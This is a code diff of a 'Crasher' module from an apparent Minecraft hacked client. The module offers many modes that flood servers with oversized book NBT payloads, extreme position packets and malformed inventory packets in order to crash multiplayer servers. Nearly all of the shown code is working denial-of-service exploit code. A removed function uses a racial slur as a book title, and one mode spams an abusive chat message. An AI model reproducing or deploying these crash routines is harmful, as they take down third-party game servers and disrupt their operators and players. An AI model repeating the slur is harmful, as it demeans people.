@@ -24,6 +24,7 @@ import net.minecraft.network.Packet;
 import net.minecraft.network.PacketBuffer;
 import net.minecraft.network.play.client.*;
 import net.minecraft.util.BlockPos;
+import net.minecraft.util.ChatComponentText;
 import net.minecraft.util.EnumChatFormatting;
 
 import java.util.ArrayList;
@@ -37,40 +38,25 @@ public class Crasher extends Module {
     public Crasher() {
         super("Crasher", Category.EXPLOIT);
         ArrayList<String> options = new ArrayList<>();
-        options.add("ServerCrash");
+        options.add("Color");
         options.add("Singlepacket");
         options.add("Fly");
         options.add("Exploitfix");
         options.add("Netty");
-        options.add("Newsinglepacket");
-        options.add("Bookcrah");
-        options.add("Commandcrash");
-        options.add("Creative");
-        options.add("Custompayload");
-        options.add("CustomPlayload2");
-        options.add("Firework");
-        options.add("Respawn");
-        options.add("Item");
-        options.add("Item2");
-        options.add("Labymod");
-        options.add("Labyfucker");
-        options.add("Spam");
-        options.add("Pex");
-        options.add("Position");
-        options.add("Entity");
-        options.add("head");
-        options.add("Place");
-        options.add("Newbook");
-        options.add("worldeditcrash");
-        options.add("Zerosmash");
-        options.add("Packetflood");
-        options.add("AuthmeCrash");
-        options.add("CustomByte");
+        options.add("Netty2");
         options.add("Mineplex");
-
-
-
-
+        options.add("CustomPayload");
+        options.add("Nullbook");
+        options.add("OpenBook");
+        options.add("AAC");
+        options.add("Move");
+        options.add("Exception");
+        options.add("NCP");
+        options.add("Replay");
+        options.add("Onground");
+        options.add("Multi");
+        options.add("Massive");
+        options.add("BookFlood");
         Client.setmgr.rSetting(mode1 = new Setting("Crasher Mode", this, "Singlepacket", options));
     }
 
@@ -83,7 +69,7 @@ public class Crasher extends Module {
 
     @EventTarget
     public void onUpdate(EventMotionUpdate e) {
-        if (Minecraft.getMinecraft().getNetHandler().getNetworkManager().getRemoteAddress().equals("astrogames.net/45.132.89.229:25565")) {
+        if (mc.getCurrentServerData().serverIP.contains("Crafting-table.de")) {
 
             PlayerUtils.sendMessage("Dieser Server Darf nicht gecrasht werden LG Bratwurst001");
             return;
@@ -92,69 +78,262 @@ public class Crasher extends Module {
         PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bypass mode Ativiert", true);
         if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
             Singlepacket();
-        } else if (mode1.getValString().equalsIgnoreCase("Massivechunkloading")) {
+        } else if (mode1.getValString().equalsIgnoreCase("Color")) {
             ServerCrash();
         } else if (mode1.getValString().equalsIgnoreCase("Fly")) {
-            Flycrasher();
+            crypto();
         } else if (mode1.getValString().equalsIgnoreCase("Exploitfix")) {
             Exploitfix();
         } else if (mode1.getValString().equalsIgnoreCase("Netty")) {
             Netty();
-        } else if (mode1.getValString().equalsIgnoreCase("Newsinglepacket")) {
-            Newsinglepacket();
-        } else if (mode1.getValString().equalsIgnoreCase("Bookcrah")) {
-            Bookcrah();
-        } else if (mode1.getValString().equalsIgnoreCase("Commandcrash")) {
-            Commandcrash();
-        } else if (mode1.getValString().equalsIgnoreCase("Creative")) {
-            Creative();
-        } else if (mode1.getValString().equalsIgnoreCase("Custompayload")) {
-            Custompayload();
-        } else if (mode1.getValString().equalsIgnoreCase("CustomPlayload2")) {
-            CustomPlayload2();
-        } else if (mode1.getValString().equalsIgnoreCase("Firework")) {
-            Firework();
-
-        } else if (mode1.getValString().equalsIgnoreCase("Respawn")) {
-            Respawn();
-        } else if (mode1.getValString().equalsIgnoreCase("Item")) {
-            Item();
-        } else if (mode1.getValString().equalsIgnoreCase("Item2")) {
-            Item2();
-        } else if (mode1.getValString().equalsIgnoreCase("Labymod")) {
-            Labymod();
-        } else if (mode1.getValString().equalsIgnoreCase("Labyfucker")) {
-            Laby2();
-        } else if (mode1.getValString().equalsIgnoreCase("Spam")) {
-            Spam();
-        } else if (mode1.getValString().equalsIgnoreCase("Pex")) {
-            Pex();
-        } else if (mode1.getValString().equalsIgnoreCase("Position")) {
-            Position();
-        } else if (mode1.getValString().equalsIgnoreCase("Entity")) {
-            Entity();
-        } else if (mode1.getValString().equalsIgnoreCase("head")) {
-            head();
-        } else if (mode1.getValString().equalsIgnoreCase("Place")) {
-            Place();
-        }else if (mode1.getValString().equalsIgnoreCase("Newbook")) {
-            newcrashb();
-        }else if (mode1.getValString().equalsIgnoreCase("worldeditcrash")) {
-                 Worledit();
-        }else if (mode1.getValString().equalsIgnoreCase("Zerosmash")) {
-                 Zerosmash();
-        }else if (mode1.getValString().equalsIgnoreCase("Packetflood"))  {
-           Packetflood();
-        }else if (mode1.getValString().equalsIgnoreCase("AuthmeCrash")) {
-         AuthmeCrash();
-        }else if (mode1.getValString().equalsIgnoreCase("CustomByte")) {
-            Custombyte();
-        }else if (mode1.getValString().equalsIgnoreCase("Mineplex")) {
+        } else if (mode1.getValString().equalsIgnoreCase("Mineplex")) {
             MinePlex();
+        } else if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
+            Singlepacket();
+        } else if (mode1.getValString().equalsIgnoreCase("CustomPayload")) {
+            CustomPayload();
+        } else if (mode1.getValString().equalsIgnoreCase("Nullbook")) {
+            nullbook();
+        } else if (mode1.getValString().equalsIgnoreCase("OpenBook")) {
+            OpenBook();
+        } else if (mode1.getValString().equalsIgnoreCase("AAC")) {
+            AAC();
+        } else if (mode1.getValString().equalsIgnoreCase("Netty2")) {
+            Nettyy();
+        } else if (mode1.getValString().equalsIgnoreCase("Move")) {
+            move();
+        } else if (mode1.getValString().equalsIgnoreCase("Exception")) {
+            Exception();
+        } else if (mode1.getValString().equalsIgnoreCase("NCP")) {
+            ncp();
+        } else if (mode1.getValString().equalsIgnoreCase("Replay")) {
+            Replay();
+        } else if (mode1.getValString().equalsIgnoreCase("Onground")) {
+            Onground();
+        } else if (mode1.getValString().equalsIgnoreCase("Multi")) {
+            Multi();
+        }else if (mode1.getValString().equalsIgnoreCase("Massive")) {
+            Massiv();
+        }else if (mode1.getValString().equalsIgnoreCase("BookFlood")) {
+            BookFlood();
         }
 
 
     }
+    public void BookFlood() {
+        ItemStack bookStack = new ItemStack(Items.writable_book);
+        NBTTagCompound bookCompound = new NBTTagCompound();
+        bookCompound.setString("author", "aaa");
+        bookCompound.setString("title", "asd");
+        NBTTagList pageList = new NBTTagList();
+        String pageText = "asdas1d2asda";
+        for (int page = 0; page < 50; ++page) {
+            pageList.appendTag(new NBTTagString("asdas1d2asda"));
+        }
+        bookCompound.setTag("pages", pageList);
+        bookStack.setTagCompound(bookCompound);
+        for (int packets = 0; packets < 100; ++packets) {
+            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
+            packetBuffer.writeItemStackToBuffer(bookStack);
+            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
+        }
+        toggle();
+    }
+    public void Massiv(){
+        for (double i2 = mc.thePlayer.posY; i2 < 255.0; i2 += 5.0) {
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX, i2, Minecraft.getMinecraft().thePlayer.posZ, true));
+        }
+        for (int i3 = 0; i3 < 6685; i3 += 5) {
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + (double)i3, 255.0, Minecraft.getMinecraft().thePlayer.posZ + (double)i3, true));
+        }
+        toggle();
+    }
+
+ public void Multi(){
+     Minecraft mc = Minecraft.getMinecraft();
+     for (int i = 0; i < 1000; ++i) {
+         mc.thePlayer.sendQueue.addToSendQueue(
+                 new C0EPacketClickWindow(0, -999, 0, 1, bigBook(), (short) 0));
+     }
+     toggle();
+ }
+    public void AAC() {
+        for (int index2 = 0; index2 < 9999; ++index2) {
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + (double) (9412 * index2), Minecraft.getMinecraft().thePlayer.getEntityBoundingBox().minY + (double) (9412 * index2), Minecraft.getMinecraft().thePlayer.posZ + (double) (9412 * index2), true));
+        }
+    }
+
+
+    public void ncp() {
+        mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18f, 9.223372E18f, true));
+    }
+
+    public void Onground() {
+        for (int i = 0; i < 3000; ++i) {
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(new Random().nextBoolean()));
+        }
+        toggle();
+    }
+
+    public void Replay() {
+        mc.thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("/replay 我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?"));
+    }
+
+    public void Exception() {
+        Minecraft mc = Minecraft.getMinecraft();
+        mc.thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, -2, 0, 3, (ItemStack) null, (short) 1));
+    }
+    public ItemStack bigBook() {
+        ItemStack itemStack = new ItemStack(Items.writable_book);
+        NBTTagCompound bookCompound = new NBTTagCompound();
+        String author = Minecraft.getMinecraft().getSession().getUsername();
+        String title = "Play with me.";
+        String size = "4567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972456723856784567894567895678298456789018745678902456781546789406734573937463249324634846543843654237645238645364523476325487234532489724567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972";
+        bookCompound.setString("author", author);
+        bookCompound.setString("title", title);
+        NBTTagList pageList = new NBTTagList();
+        String pageText = size;
+
+
+        for(int page = 0; page < 50; ++page) {
+            pageList.appendTag(new NBTTagString(pageText));
+        }
+
+        bookCompound.setTag("pages", pageList);
+        itemStack.setTagCompound(bookCompound);
+        return itemStack;
+    }
+    public static int move = 0;
+
+    public void move() {
+        if (mc.thePlayer.moveForward != 0) {
+            move++;
+            double x = Minecraft.getMinecraft().thePlayer.posX;
+            double y = Minecraft.getMinecraft().thePlayer.posY;
+            double z = Minecraft.getMinecraft().thePlayer.posZ;
+            double d1 = 0.0;
+            for (int i2 = 0; i2 < 10; ++i2) {
+                for (int i3 = 0; i3 < 10000; ++i3) {
+                    d1 = i3 * 9;
+                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z + d1, false));
+                }
+            }
+            if (move == 3) {
+                toggle();
+            }
+        }
+
+    }
+
+    public void Nettyy() {
+
+        ItemStack book = new ItemStack(Items.writable_book);
+        mc.thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 500, 2, 1, book, (short) -999));
+    }
+
+    public void OpenBook() {
+        try {
+            ItemStack book = new ItemStack(Items.writable_book);
+            NBTTagList list = new NBTTagList();
+            NBTTagCompound tag = new NBTTagCompound();
+            String author = Minecraft.getMinecraft().getSession().getUsername();
+            String title = "Play with me.";
+            String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+            for (int i2 = 0; i2 < 50; ++i2) {
+                String siteContent = size;
+                NBTTagString tString = new NBTTagString(siteContent);
+                list.appendTag(tString);
+            }
+            tag.setString("author", author);
+            tag.setString("title", title);
+            tag.setTag("pages", list);
+            book.setTagInfo("pages", list);
+            book.setTagCompound(tag);
+            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
+        } catch (Exception e2) {
+            return;
+        }
+    }
+
+    public void CustomPayload() {
+        ItemStack book = new ItemStack(Items.writable_book);
+        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
+        packetBuffer.writeItemStackToBuffer(book);
+        mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
+
+    }
+
+    public void nullbook() {
+        NBTTagList bookPages = new NBTTagList();
+        for (int i2 = 0; i2 < 16300; ++i2) {
+            bookPages.appendTag(new NBTTagString(""));
+        }
+        for (int i3 = 0; i3 < 10; ++i3) {
+            ItemStack book = new ItemStack(Items.writable_book);
+            book.setTagInfo("pages", bookPages);
+            PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
+            pb.writeItemStackToBuffer(book);
+            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", pb));
+        }
+    }
+
+
+    public void ServerCrash() {
+        Minecraft mc = Minecraft.getMinecraft();
+        final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+        final ItemStack item = new ItemStack(Items.writable_book);
+        final NBTTagCompound nbt = new NBTTagCompound();
+        final NBTTagList pages = new NBTTagList();
+        final NBTTagString page = new NBTTagString(
+                "a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a");
+        for (int i = 0; i < 2; ++i) {
+            pages.appendTag((NBTBase) page);
+        }
+        nbt.setTag("pages", (NBTBase) pages);
+        nbt.setTag("author", (NBTBase) new NBTTagString("MEDDL"));
+        nbt.setTag("title", (NBTBase) new NBTTagString("LEUDE"));
+        buffer.writeItemStackToBuffer(item);
+        mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", buffer));
+    }
+
+    public void crypto() {
+        int time = 0;
+        while ((double) time < 10) {
+            ItemStack bookObj = new ItemStack(Items.writable_book);
+            NBTTagList bookPages = new NBTTagList();
+            for (int i = 0; i < 4000; ++i) {
+                bookPages.appendTag(new NBTTagString("a"));
+            }
+            while (bookPages.tagCount() > 1) {
+                String s2 = bookPages.getStringTagAt(bookPages.tagCount() - 1);
+                if (s2.length() != 0) break;
+                bookPages.removeTag(bookPages.tagCount() - 1);
+            }
+            if (bookObj.hasTagCompound()) {
+                NBTTagCompound nbttagcompound = bookObj.getTagCompound();
+                nbttagcompound.setTag("pages", bookPages);
+            } else {
+                bookObj.setTagInfo("pages", bookPages);
+            }
+            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
+            packetbuffer.writeItemStackToBuffer(bookObj);
+            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", packetbuffer));
+            bookObj.setTagInfo("author", new NBTTagString("a"));
+            bookObj.setTagInfo("title", new NBTTagString("a"));
+            for (int i = 0; i < bookPages.tagCount(); ++i) {
+                String s1 = bookPages.getStringTagAt(i);
+                ChatComponentText chatComponentText = new ChatComponentText(s1);
+                s1 = ChatComponentText.Serializer.componentToJson(chatComponentText);
+                bookPages.set(i, new NBTTagString(s1));
+            }
+            packetbuffer = new PacketBuffer(Unpooled.buffer());
+            packetbuffer.writeItemStackToBuffer(bookObj);
+            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BSign", packetbuffer));
+            ++time;
+        }
+
+    }
+
 
     public void Singlepacket() {
         PlayerUtils.sendMessage(EnumChatFormatting.RED + "Crashing....");
@@ -193,309 +372,80 @@ public class Crasher extends Module {
         return stringBuilder.toString();
     }
 
-    public void ServerCrash() {
-        if (mc.isSingleplayer()) {
-
-            return;
-        }
-        double playerX = mc.thePlayer.posX;
-        double playerY = mc.thePlayer.posY;
-        double playerZ = mc.thePlayer.posZ;
-        double y = 0;
-        double x = 0;
-        double z = 0;
-        for(int i = 0; i < 2000;) {
-            y = i * 9;
-            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
-            i++;
-        }
-        for(int i = 0; i < 10000;) {
-            z = i * 9;
-            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
-            i++;
-        }
-    }
-
-    public void Flycrasher() {
-        for (int i = 0; i < Packets.getValInt(); i++) {
-
-            double itm = mc.thePlayer.posX;
-            double o = mc.thePlayer.posY;
-            double playerZ = mc.thePlayer.posZ;
-            double y = 0.0D;
-            double x = 0.0D;
-            double z = 0.0D;
-            int i1;
-            y = (i * 9);
-            (mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ, false));
-            for (i1 = 0; i1 < 10000; i1++) {
-                z = (i1 * 9);
-
-                (mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ + z, false));
-            }
-
-        }
-    }
 
     public void Exploitfix() {
-        Minecraft mc = Minecraft.getMinecraft();
-        for (int index = 0; index < 999; ++index) {
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 500000 * index,
-                    mc.thePlayer.getEntityBoundingBox().minY + 500000 * index,
-                    mc.thePlayer.posZ + 500000 * index, true));
+        ItemStack book = null;
+
+        book = new ItemStack(Items.writable_book);
+
+        final NBTTagList list = new NBTTagList();
+        final NBTTagCompound tag = new NBTTagCompound();
+        final String author = mc.getSession().getUsername();
+        final String title = "Meta.exe";
+        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+        for (int i = 0; i < 50; ++i) {
+            final NBTTagString tString = new NBTTagString(size);
+            list.appendTag((NBTBase) tString);
+        }
+        tag.setString("author", author);
+        tag.setString("title", title);
+        tag.setTag("pages", (NBTBase) list);
+        book.setTagInfo("pages", (NBTBase) list);
+        book.setTagCompound(tag);
+        try {
+            for (int j = 0; j < 4; ++j) {
+                mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(
+                        new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
+            }
+        } catch (Exception ex) {
         }
         toggle();
     }
 
 
     public void Netty() {
-        for (int i2 = 0; i2 < 50; i2++) {
+        for (int i2 = 0; i2 < 50; ++i2) {
             ItemStack book = new ItemStack(Items.writable_book);
-            String author = "Netty" + (new Random()).nextInt(50);
+            String author = "Netty" + new Random().nextInt(50);
             String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
             NBTTagCompound tag = new NBTTagCompound();
             NBTTagList list = new NBTTagList();
-            for (int i3 = 0; i3 < 340; i3++) {
-                NBTTagString tString = new NBTTagString(size);
-                list.appendTag((NBTBase) tString);
+            for (int i3 = 0; i3 < 340; ++i3) {
+                String siteContent = size;
+                NBTTagString tString = new NBTTagString(siteContent);
+                list.appendTag(tString);
             }
             tag.setString("author", author);
             tag.setString("title", "");
-            tag.setTag("pages", (NBTBase) list);
+            tag.setTag("pages", list);
             if (book.hasTagCompound()) {
                 NBTTagCompound tagb = book.getTagCompound();
-                tagb.setTag("pages", (NBTBase) list);
+                tagb.setTag("pages", list);
             } else {
-                book.setTagInfo("pages", (NBTBase) list);
+                book.setTagInfo("pages", list);
             }
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, book, 0.0F, 0.0F, 0.0F));
+            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
         }
         toggle();
     }
 
-    public void Newsinglepacket() {
-        ItemStack book = new ItemStack(Items.writable_book);
-        NBTTagList list = new NBTTagList();
-        NBTTagCompound tag = new NBTTagCompound();
-
-        String size = "blzqbuvjxvmswphhwenqgufshaiughkashkjghsakjhkjrjajhfkshakhgayhoahiuwfhawfhshafhas, fsaghgasjkgsabkjkfjnsahbfkjsahlkfhsa,sfjkahkfhsajgasj, hgfsajkhgjashghsaghaskhjgfas , oshgahgashgashgas, 85973198F(&S^A&(YR#@YA(6d978A(SYF(S^A(GAShc(SH(GFSA^(G&ASOHVSA&FGSA(GOIASSA&FG)US)GUSAJCSAY)GUS)(AUGS)CSAYG)SAU)CINSA)(YGSAY)CNSA)(HG()SYCSACHKSAHF(^&(^(F^SA(^(^(SF^(SA^(^(^(FSA^(^(RS(A^($^(Q#^($^Q(*^";
-
-        for (int i = 0; i < 300; i++) {
-            String siteContent = size;
-            NBTTagString tString = new NBTTagString(siteContent);
-            list.appendTag(tString);
-        }
-        tag.setString("author", "zBrutal96");
-        tag.setString("title", "STFU YOONIKS");
-        tag.setTag("pages", list);
-        book.setTagInfo("pages", list);
-        book.setTagCompound(tag);
-
-    }
-
-    public void Bookcrah() {
-        try {
-            ItemStack book = new ItemStack(Items.writable_book);
-            String author = Minecraft.getMinecraft().getSession().getUsername();
-            String title = "Nigger";
-            String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-            NBTTagCompound tag = new NBTTagCompound();
-            NBTTagList list = new NBTTagList();
-            for (int i2 = 0; i2 < 35; i2++) {
-                String siteContent = size;
-                NBTTagString tString = new NBTTagString(siteContent);
-                list.appendTag((NBTBase) tString);
-            }
-            tag.setString("author", author);
-            tag.setString("title", title);
-            tag.setTag("pages", (NBTBase) list);
-            book.setTagInfo("pages", (NBTBase) list);
-            book.setTagCompound(tag);
-            try {
-                for (int j = 0 ; j < 10; j++)
-                    Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C10PacketCreativeInventoryAction(2147483647, book));
-            }catch (Exception e) {
-                e.printStackTrace();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-     
-    }
-
-    public void Commandcrash() {
